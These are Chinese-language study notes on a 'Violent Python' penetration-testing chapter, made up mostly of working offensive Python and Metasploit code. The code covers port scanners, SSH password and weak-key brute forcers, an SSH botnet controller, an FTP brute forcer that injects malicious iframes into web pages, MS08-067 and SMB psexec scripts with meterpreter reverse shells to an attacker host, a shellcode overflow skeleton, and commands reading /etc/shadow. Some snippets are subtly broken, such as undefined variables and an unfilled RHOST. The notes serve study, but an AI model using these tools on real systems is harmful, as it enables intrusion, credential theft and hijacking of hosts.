# 第 2 章 用 Python 进行渗透测试

## 编写一个端口扫描器

Python 提供了访问 BSD 套接字的接口

Web 服务器可能位于 TCP 80 端口、电子邮件服务器在 TCP 25 端口、FTP 服务器在 TCP 21 端口

### TCP 全连接扫描

为了抓取目标主机上应用的 Banner，找到开放的端口后，向它发送一个数据串并等待响应

```python
#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
"""
2017.01.29 按照第 2 章编写一个端口扫描器
"""
import optparse
import socket

__author__ = '__L1n__w@tch'


def initialize():
    parser = optparse.OptionParser("usage %prog -H <target host> -p <target port>")

    parser.add_option("-H", dest="target_host", type=str, help="specify target host")
    parser.add_option("-p", dest="target_port", type=int, help="specify target port")

    options, args = parser.parse_args()

    target_host = options.target_host
    target_port = options.target_port

    if target_host is None or target_port is None:
        print(parser.usage)
        exit(-1)

    return target_host, target_port


def connect_scan(target_host, target_port):
    """
    TCP 全连接扫描
    :param target_host: 目标主机
    :param target_port: 目标端口
    :return:
    """
    try:
        conn_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn_sock.connect((target_host, target_port))
        print("[+] {}/tcp open".format(target_port))

        conn_sock.send(b"Violent Python")
        results = conn_sock.recv(1024)
        print("[+] Get Response: {}".format(results))
        conn_sock.close()
    except socket.timeout:
        print("[-] {}/tcp closed".format(target_port))


def port_scan(target_host, target_ports):
    """
    执行端口扫描操作
    :param target_host: 目标主机
    :param target_ports: 目标端口列表
    :return:
    """
    try:
        target_ip = socket.gethostbyname(target_host)
    except RuntimeError:
        print("[-] Can not resolve {}: Unknown host".format(target_host))
        return

    try:
        target_name = socket.gethostbyaddr(target_ip)
        print("[+] Scan results for {}".format(target_name[0]))
    except RuntimeError:
        print("[+] Scan Results for {}".format(target_ip))

    socket.setdefaulttimeout(1)

    for target_port in target_ports:
        print("[*] Scanning port {}".format(target_port))
        connect_scan(target_host, target_port)


if __name__ == "__main__":
    host, port = initialize()
    port_scan(host, [port])

```

#### 线程扫描

多线程可以提升速度，但是有一个缺点，屏幕打印消息可能会出现乱码和失序。因此需要信号量来进行加解锁，在打印消息前使用 `acquire()`，打印结束后使用 `release()`

```python
screen_lock = Semaphore(value=1)
try:
    screen_lock.acquire()
    print("print anything")
finally:
    screen_lock.release()
```

#### 使用 NMAP 端口扫描代码

除了 TCP 连接扫描外，还需要其他类型的扫描，比如 ACK、RST、FIN 或 SYN-ACK 扫描等

Fyodor Vaskovich 编写的 Nmap 能使用 C 和 Lua 编写的脚本，但是 Nmap 还能被很好地整合到 Python 中。Nmap 可以生成基于 XML 的输出。

##### 其他端口扫描类型

* TCP SYN SCAN——半开放扫描，这种类型的扫描发送一个 SYN 包，启动一个 TCP 会话，并等待响应的数据包。如果收到的是一个 reset 包，表明端口是关闭的，而如果收到的是一个 SYN/ACK 包，则表示相应的端口是打开的
* TCP NULL SCAN——NULL 扫描把 TCP 头中的所有标志位都设为 NULL。如果收到的是一个 RST 包，则表示相应的端口是关闭的
* TCP FIN SCAN——TCP FIN 扫描发送一个表示拆除一个活动的 TCP 连接的 FIN 包，让对方关闭连接。如果收到了一个 RST 包，则表示相应的端口是关闭的
* TCP XMAS SCAN——TCP XMAS 扫描发送 PSH、FIN、URG 和 TCP 标志位被设为 1 的数据包。如果收到了一个 RST 包，则表示相应的端口是关闭的

***

安装好 Python-Nmap 之后，就可以将 Nmap 导入到现有的脚本中，并在 Python 中直接使用 Nmap 扫描功能。创建一个 PortScanner（） 类对象，则可以用这个对象完成扫描操作。PortScanner 类有一个 `scan()` 函数，它可将目标和端口的列表作为参数输入，并对它们进行基本的 Nmap 扫描。

```python
import nmap

def nmap_scan(target_host, target_port):
    nm_scan = nmap.PortScanner()
    nm_scan.scan(target_host, target_port)
    state = nm_scan[target_host]["tcp"][int(target_port)]["state"]
    print("[*] {} tcp/{} {}".format(target_host, target_port, state))
```

## 用 Python 构建一个 SSH 僵尸网络

Morris 蠕虫有三种攻击方式，其中之一就是用常见的用户名和密码尝试登录 RSH 服务（remote shell）。RSH 是 1988 年问世的，它为系统管理员提供了一种很棒的远程连接一台机器，并能在主机上运行一系列终端命令对它进行管理的办法。

后来人们在 RSH 中增加一个公钥加密算法，以保护其经过网络传递的数据，这就是 SSH（Secure Shell）协议，最终 SSH 取代了 RSH。

SSH 蠕虫已经被证明是非常成功的和常见的攻击方式

### 用 Pexpect 与 SSH 交互

为了能完成控制台交互过程，需要用 Pexpect 模块实现与程序交互、等待预期的屏幕输出等。

以下实现 `connect()` 函数，该函数接收用户名、主机名和密码，返回此 SSH 连接的结果。

一旦通过验证，就可以使用一个单独的 `command()` 函数在 SSH 会话中发送命令。

【PS】下面这个在 macOSX 上就没跑通过，相关问题[链接](http://stackoverflow.com/questions/17879585/eof-when-using-pexpect-and-pxssh)

```python
import pexpect

PROMPT = ["# ", ">>> ", "> ", "\$ "]

def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)

def connect(user, host, password):
    ssh_new_key = "Are you sure you want to continue connecting\n"
    conn_str = "ssh {}@{}\n".format(user, host)
    child = pexpect.spawn(conn_str)
    ret = child.expect([pexpect.TIMEOUT, ssh_new_key, "{}@{}'s password:".format(user, host)])

    if ret == 0:
        print("[-] Error Connecting")
        exit(-1)
    elif ret == 1:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, "[P|p]assword:"])
        if ret == 0:
            print("[-] Error Connecting")
            exit(-1)
        child.sendline(password)
        child.expect(PROMPT)
        return child
    else:
        print(child)
    exit(-1)

if __name__ == "__main__":
    child = connect("root", "192.168.158.157", "toor")
    send_command(child, "cat /etc/shadow | grep root")
```

### 用 Pxssh 暴力破解 ssh 密码

Pxssh 导入方式：`import pexpect.pxssh`

Pxssh 是一个包含了 `pexpect` 库的专用脚本，它能用预先写好的 `login()`、`logout()` 和 `prompt()` 等函数直接与 `SSH` 进行交互。

【PS】以下仅实现了连接功能，但是依旧连接不上，问题同上。

```python
import pexpect.pxssh as pxssh
import traceback

def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print(s.before)

def connect(host, user, password):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        return s
    except Exception as e:
        traceback.print_exc()
        print("[-] Error Connecting")
        exit(-1)

if __name__ == "__main__":
    ssh = connect("localhost", "root", "Lin982674")
    send_command(ssh, "cat /etc/shadow | grep root")
```

接下来稍微修改下 `connect()` 函数即可实现爆破。如果异常显示 socket 为 `read_nonblocking`，可能是 SSH 服务器被大量的连接刷爆了；如果该异常显示 `pxssh` 命令提示符提取困难，可以等一会再试。这里实现的 `connect()` 可以递归地调用另一个 `connect()` 函数，所以必须让只有不是由 `connect()` 递归调用的 `connect()` 函数才能够释放 `connection_lock` 信号，书中给的最终脚本如下：

```python
import pexpect.pxssh as pxssh
import optparse
import time
import threading

max_connections = 5
connection_lock = threading.BoundedSemaphore(value=max_connections)
found = False
fails = 0

def connect(host, user, password, release):
    global found, fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("[+] Password Found: {}".format(password))
        found = True
    except Exception as e:
        if "read_nonblocking" in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif "synchronize with original prompt" in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser("usage %prog -H <target host> -u <user> -F <password list>")
    parser.add_option("-H", dest="target_host", type=str, help="specifiy target host")
    parser.add_option("-F", dest="password_file", type=str, help="specifiy password file")
    parser.add_option("-u", dest="user", type=str, help="specifiy the user")

    options, args = parser.parse_args()
    target_host = options.target_host
    password_file = options.password_file
    user = options.user

    if target_host is None or password_file is None or user is None:
        print(parser.usage)
        exit(-1)

    with open(password_file, "r") as f:
        for line in f.readlines():
            if found:
                print("[*] Exiing: Password Found")
                exit(0)
            if fails > 5:
                print("[!] Exiting: Too Many Socket Timeouts")
                exit(-1)
            connection_lock.acquire()
            password = line.strip("\r\n")
            print("[-] Testing: {}".format(password))
            t = threading.Thread(target=connect, args=(host, user, password, True))
            child = t.start()

if __name__ == "__main__":
    main()
```

iPhone 设备上 root 用户的默认密码为：`alpine`，当设备越狱后，用户会在 iPhone 上启用一个 OpenSSH 服务

### 利用 SSH 中的弱私钥

对于 SSH 服务器，密码验证并不是唯一的手段。除此之外，SSH 还能使用公钥加密的方式进行验证。在使用这一验证方法时，服务器和用户分别掌握公钥和私钥。使用 RSA 或是 RSA 算法，服务器能生成用于 SSH 登录的密钥。

不过，2006 年 Debian Linux 发行版中发生了一件有意思的事。软件自动分析工具发现了一行已被开发人员注释掉的代码。这行被注释掉的代码用来确保创建 SSH 密钥的信息量足够大。被注释掉之后，密钥空间的大小的熵值降低到只有 15 位大小。此时可能的密钥只有 32767 个。Rapid7 的 CSO 和 HD Moore 在两个小时内生成了所有的 1024 位和 2048 位算法的可能的密钥。而且，把结果放在了[网上](http://digitaloffense.net/tools/debianopenssl/)中，大家都可以下载使用。

由此可以进行暴力破解，在使用密钥登录 SSH 时，需要键入 `ssh user@host -i keyfile -o PasswordAuthentication=no` 格式的一条命令。DEMO 代码如下：

```python
import pexpect
import optparse
import os
import threading

max_connections = 5
connection_lock = threading.BoundedSemaphore(value=max_connections)
stop = False
fails = 0

def connect(user, host, key_file, release):
    global stop, fails
    try:
        perm_denied = "Permission denied"
        ssh_new_key = "Are you sure you want to continue"
        conn_closed = "Connection closed by remote host"

        opt = " -o PasswordAuthentication=no"
        conn_str = "ssh {}@{} -i {}{}".format(user, host, key_file, opt)
        child = pexpect.spawn(conn_str)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_new_key, conn_closed, "$", "#", ])
        if ret == 2:
            print("[-] Adding Host to !/.ssh/known_hosts")
            child.sendline("yes")
            connect(user, host, key_file, False)
        elif ret == 3:
            print("[-] Connection Closed By Remote Host")
            fails += 1
        elif ret > 3:
            print("[+] Success. {}".format(key_file))
            stop = True
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser("usage %prog -H <target_host> -u <user> -d <directory>")
    parser.add_option("-H", dest="target_host", type=str, help="specify target host")
    parser.add_option("-d", dest="pass_dir", type=str, help="specify directory with keys")
    parser.add_option("-u", dest="user", type=str, help="specify the user")

    options, args = parser.parse_args()
    target_host = options.target_host
    pass_dir = options.pass_dir
    user = options.user

    if target_host is None or pass_dir is None or user is None:
        print(parser.usage)
        exit(-1)

    for file_name in os.listdir(pass_dir):
        if stop:
            print("[*] Exiting: Key Found.")
            exit(0)
        if fails > 5:
            print("[!] Exiting: Too Many Connections Closed By Remote Host.")
            print("[!] Adjust number of simultaneous threads.")
            exit(0)
        connection_lock.acquire()

        full_path = os.path.join(pass_dir, file_name)
        print("[-] Testing keyfile {}".format(full_path))
        t = threading.Thread(target=connect, args=(user, target_host, full_path, True))
        child = t.start()

if __name__ == "__main__":
    main()
```

### 构建 SSH 僵尸网络

每个单独的僵尸或者 client 都需要有能连上某台肉机，并把命令发送给肉机的能力

```python
import optparse
import pexpect.pxssh as pxssh

bot_net = list()

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print("[-] Error Connecting")

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def bot_net_command(command):
    for client in bot_net:
        output = client.send_command(command)
        print("[*] Output from {}".format(client.host))
        print("[+] {}".format(output))

def add_client(host, user, password):
    client = Client(host, user, password)
    bot_net.append(client)

if __name__ == "__main__":
    add_client("10.10.10.110", "root", "toor")
    add_client("10.10.10.120", "root", "toor")
    add_client("10.10.10.130", "root", "toor")
    bot_net_command("uname -v")
    bot_net_command("cat /etc/issue")
```
## 利用 FTP 与 Web 批量抓 “肉机”

### 用 Python 构建匿名 FTP 扫描器

可以利用 Python 中的 ftplib 库编写一个小脚本，确定一个服务器是否允许匿名登录

```python
import ftplib
def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login("anonymous", "me@your.com")
        print("[*] {} FTP Anonymous Logon Succeeded.".format(host))
        ftp.quit()
        return True
    except Exception as e:
        print("[-] {} FTP Anonymous Logon Failed.".format(host))
        return False


if __name__ == "__main__":
    host = "192.168.158.161"
    anon_login(host)
```

### 使用 Ftplib 暴力破解 FTP 用户口令

`FileZilla` 之类的 FTP 客户端程序往往将密码以明文形式存储在配置文件中

只要将上面的 `ftp.login()` 替换上对应的用户名和密码就可以验证了

### 在 FTP 服务器上搜索网页

使用 `nlst` 函数，这会列出目录中所有文件的命令

```python
dir_list = ftp.nlst()
```

### 在网页中加入恶意注入代码

直接使用 `metasploit` 框架生成：

```shell
msfcli exploit/windows/browser/ms10_002_aurora
```

上传的命令：

```python
ftp.storlines("STOR {}".format(page), open("{}.tmp".format(page)))
```

### 完整的代码 DEMO

虽然很多余，但还是把整个流程打一遍吧

```python
import ftplib
import optparse
import time

def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login("anonymous", "me@your.com")
        print("[*] {} FTP Anonymous Logon Succeeded.".format(hostname))
        ftp.quit()
        return True
    except Exception as e:
        print("[-] {} FTP Anonymous Logon Failed.".format(hostname))
        return False

def brute_login(hostname, password_file):
    pf = open(password_file, "r")
    for line in pf.readlines():
        time.sleep(1)
        user_name = line.split(":")[0]
        password = line.split(":")[1].strip("\r\n")
        print("[+] Trying: {}/{}".format(user_name, password))

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user_name, password)
            print("[*] {} FTP Logon Succeeded: {}/{}".format(hostname, user_name, password))
            ftp.quit()
            return user_name, password
        except Exception as e:
            pass
    print("[-] Could not brute force FTP credentials.")
    return None, None

def return_default(ftp):
    dir_list = list()
    try:
        dir_list = ftp.nlst()
    except:
        print("[-] Could not list directory contents.")
        print("[-] Skipping To Next Target.")
        return dir_list

    ret_list = list()
    for file_name in dir_list:
        fn = file_name.lower()
        if ".php" in fn or ".htm" in fn or ".asp" in fn:
            print("[+] Found default page: {}".format(file_name))
        ret_list.append(file_name)

    return ret_list

def inject_page(ftp, page, redirect):
    f = open("{}.tmp".format(page), "w")
    ftp.retrlines("RETR {}".format(page), f.write)
    print("[+] Downloaded Page: {}".format(page))
    f.write(redirect)
    f.close()

    print("[+] Injected Malicious IFrame on: {}".format(page))
    ftp.storlines("STOR {}".format(page), open("{}.tmp".format(page)))
    print("[+] Uploaded Injected Page: {}".format(page))

def attack(username, password, target_host, redirect):
    ftp = ftplib.FTP(target_host)
    ftp.login(username, password)
    def_pages = return_default(ftp)
    for def_page in def_pages:
        inject_page(ftp, def_page, redirect)

def main():
    parser = optparse.OptionParser("usage%prog -H <target host[s]> -r <redirect page>[-f <user_pass file>]")

    parser.add_option("-H", dest="target_hosts", type=str, help="specify target host")
    parser.add_option("-f", dest="password_file", type=str, help="specify user/password file")
    parser.add_option("-r", dest="redirect", type=str, help="specify a redirection page")

    options, args = parser.parse_args()
    target_hosts = str(options.target_hosts).split(", ")
    password_file = options.password_file
    redirect = options.redirect

    if target_hosts is None or redirect is None:
        print(parser.usage)
        exit(-1)

    for target_host in target_hosts:
        username, password = None, None
        if anon_login(target_host):
            username, password = "test", "test"
            print("[+] Using Anonymous Creds to attack")
            attack(username, password, target_host, redirect)
        elif password_file is not None:
            username, password = brute_login(target_host, password_file)
            if password is not None:
                print("[+] Using Creds: {}/{} to attack".format(username, password))
                attack(username, password, target_host, redirect)

if __name__ == "__main__":
    main()
```
## Conficker，为什么努力做就够了

蠕虫病毒，Conficker（或称为 W32DownandUp），在其基本的感染方法中，Conficker 蠕虫使用了两种不同的攻击方法。首先利用了 Windows 服务器中一个服务的 0Day 漏洞。利用这个栈溢出漏洞，蠕虫能在被感染的主机上执行 ShellCode 并下载蠕虫。当这种攻击失败时，Conficker 蠕虫又尝试暴力破解默认的管理员网络共享（`ADMIN$`）的口令以获取肉机访问权。

### 使用 Metasploit 攻击 Windows SMB 服务

虽然攻击者可以通过交互驱动的方式使用 Metasploit，但 Metasploit 也能读取批处理脚本（rc）完成攻击。在攻击时，Metasploit 会顺序执行批处理文件中的命令。

```shell
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.1.37
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.77.77
set LPORT 7777
exploit -j -z

msfconsole -r conficker.rc
> sessions -i 1
> execute -i -f cmd.exe
```

### 编写 Python 脚本与 Metasploit 交互

首先需要扫描网段内所有开放 445 端口的主机，TCP 445 端口主要是作为 SMB 协议的默认端口用的

```python
import nmap
def find_target(sub_net):
    nm_scan = nmap.PortScanner()
    nm_scan.scan(sub_net, "445")
    target_hosts = list()
    for host in nm_scan.all_hosts():
        if nm_scan[host].has_tcp(445):
            state = nm_scan[host]["tcp"][445]["state"]
            if state == "open":
                print("[+] Found Target Host: {}".format(host))
	return target_hosts
```

接下来需要编写一个监听器，这个监听器或称命令与控制信道，用于与目标主机进行远程交互

Metasploit 提供了一个 Meterpreter 的高级动态负载，当 Meterpreter 进程回连接到攻击者的计算机等候执行进一步的命令时，要使用一个名为 `multi/handler` 的 Metasploit 模块去发布命令。接下来需要把各条指令写入 Metasploit 的 rc 脚本中

```python
def setup_handler(config_file, lhost, lport):
    config_file.write("use exploit/multi/handler\n")
    config_file.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
    config_file.write("set LPORT {}\n".format(lport))
    config_file.write("set LHOST {}\n".format(lhost))
    config_file.write("exploit -j -z\n")
    config_file.write("setg DisablePayloadHandler 1\n")
```

注意脚本发送了一条指令：在同一个任务（job）的上下文环境中（-j），不与任务进行即时交互的条件下（-z）利用目标计算机上的漏洞

```python
def conficker_exploit(config_file, target_host, lhost, lport):
    config_file.write("use exploit/windows/smb/ms08_067_netapi\n")
    config_file.write("set RHOST {}\n".format(target_host))
    config_file.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
    config_file.write("set LPORT {}\n".format(lport))
    config_file.write("set LHOST {}\n".format(lhost))
    config_file.write("exploit -j -z\n")
```

### 暴力破解口令，远程执行一个进程

需要用暴力攻击的方式破解 SMB 用户名/密码，以此获取权限在目标主机上远程执行一个进程（psexec）

```python
def smb_brute(config_file, target_host, passwd_file, lhost, lport):
    username = "Administrator"
    pf = open(passwd_file, "r")
    for password in pf.readlines():
        password = password.strip("\r\n")
        config_file.write("use exploit/windows/smb/psexec\n")
        config_file.write("set SMBUser {}\n".format(username))
        config_file.write("set SMBPass {}\n".format(password))
        config_file.write("set RHOST {}\n")
        config_file.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
        config_file.write("set LPORT {}\n".format(lport))
        config_file.write("set LHOST {}\n".format(lhost))
        config_file.write("exploit -j -z\n")
```

### 整合

最主要的是 main 函数如何与 metasploit 交互，发现是通过 rc 文件

```python
config_file = open("meta.rc", "w")
...
os.system("msfconsole -r meta.rc")
```

## 编写你自己的 0day 概念验证代码

Morris 蠕虫成功的原因在某种程度上其实就是利用了 Finger service 中的一个基于栈的缓冲区溢出

### 基于栈的缓冲区溢出攻击

```python
shellcode = ("\xbf\x5c....")
overflow = "\x41" * 246
ret = struct.pack("<L", 0x7c874413)
padding = "\x90" * 150
crash = overflow + ret + padding + shellcode
```

### 发送漏洞利用代码

使用 `Berkeley Socket API` 发送，其实就是套接字发送，之前在学校课程已经接触过了，不记录了